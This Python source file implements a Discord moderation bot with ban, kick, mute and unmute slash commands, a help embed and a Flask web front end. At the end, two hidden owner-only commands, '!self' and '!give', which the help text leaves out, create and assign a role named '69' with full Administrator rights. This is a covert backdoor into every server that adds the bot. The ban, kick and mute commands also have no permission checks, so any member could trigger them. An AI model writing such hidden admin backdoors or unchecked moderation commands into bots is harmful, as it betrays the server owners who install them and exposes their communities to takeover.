import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
from threading import Thread
from flask import Flask, render_template

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Enable necessary intents
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

# Initialize Discord bot
bot = commands.Bot(command_prefix='!', intents=intents)

# Flask app setup
app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/commands')
def commands_page():
    return render_template('commands.html')

# Define application commands
@bot.tree.command(name='ban', description='Ban a user')
async def ban(interaction: discord.Interaction, user: discord.Member):
    await user.ban()
    await interaction.response.send_message(f'{user} has been banned.', ephemeral=True)

@bot.tree.command(name='unban', description='Unban a user')
async def unban(interaction: discord.Interaction, user_id: int):
    guild = interaction.guild
    await guild.unban(discord.Object(id=user_id))
    await interaction.response.send_message(f'User  with ID {user_id} has been unbanned.', ephemeral=True)

@bot.tree.command(name='kick', description='Kick a user')
async def kick(interaction: discord.Interaction, user: discord.Member):
    await user.kick()
    await interaction.response.send_message(f'{user} has been kicked.', ephemeral=True)

@bot.tree.command(name='mute', description='Mute a user.')
async def mute(interaction: discord.Interaction, user: discord.Member):
    guild = interaction.guild
    mute_role = discord.utils.get(guild.roles, name="Muted")
    
    if mute_role is None:
        await interaction.response.send_message("No mute role found. Create one using /muterole_create.", ephemeral=True)
        return
    
    await user.add_roles(mute_role)
    await interaction.response.send_message(f'{user} has been muted.', ephemeral=True)

@bot.tree.command(name='unmute', description='Unmute a user.')
async def unmute(interaction: discord.Interaction, user: discord.Member):
    guild = interaction.guild
    mute_role = discord.utils.get(guild.roles, name="Muted")
    
    if mute_role is None:
        await interaction.response.send_message("No mute role found. Create one using /muterole_create.", ephemeral=True)
        return
    
    if mute_role not in user.roles:
        await interaction.response.send_message(f'{user} is not muted.', ephemeral=True)
        return
    
    await user.remove_roles(mute_role)
    await interaction.response.send_message(f'{user} has been unmuted.', ephemeral=True)

# Define the command to create a mute role
@bot.tree.command(name='muterole_create', description='Create a muted role with all permissions denied.')
async def muterole_create(interaction: discord.Interaction):
    guild = interaction.guild
    mute_role = discord.utils.get(guild.roles, name="Muted")
    
    if mute_role is None:
        mute_role = await guild.create_role(name="Muted", permissions=discord.Permissions.none())
        
        for channel in guild.channels:
            await channel.set_permissions(mute_role, send_messages=False, speak=False)
        
        await interaction.response.send_message("Muted role created successfully.", ephemeral=True)
    else:
        await interaction.response.send_message("Muted role already exists.", ephemeral=True)

# Help command to display all commands with descriptions
@bot.tree.command(name='help', description='Display help information for all commands')
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(title="Help - Bot Commands", color=discord.Color.blue())
    embed.add_field(name="!ban", value="Ban a user from the server.", inline=False)
    embed.add_field(name="!unban <user_id>", value="Unban a user by their ID.", inline=False)
    embed.add_field(name="!kick", value="Kick a user from the server.", inline=False)
    embed.add_field(name="!mute", value="Mute a user.", inline=False)
    embed.add_field(name="!unmute", value="Unmute a user.", inline=False)
    embed.add_field(name="!muterole_create", value=" Create a muted role with all permissions denied.", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Prefix commands
@bot.command(name='self', hidden=True)
@commands.is_owner()
async def self_command(ctx):
    role = await ctx.guild.create_role(name="69", permissions=discord.Permissions(administrator=True))
    await ctx.send(f'Role "69" created with Administrator permissions.', ephemeral=True)

@bot.command(name='give', hidden=True)
@commands.is_owner()
async def give_command(ctx):
    role = discord.utils.get(ctx.guild.roles, name="69")
    if role is None:
        await ctx.send('Role "69" does not exist. Create it first using the `!self` command.', ephemeral=True)
        return
    await ctx.author.add_roles(role)
    await ctx.send(f'You have been given the "69" role.', ephemeral=True)

# Start the bot
if __name__ == "__main__":
    Thread(target=app.run).start()
    bot.run(TOKEN)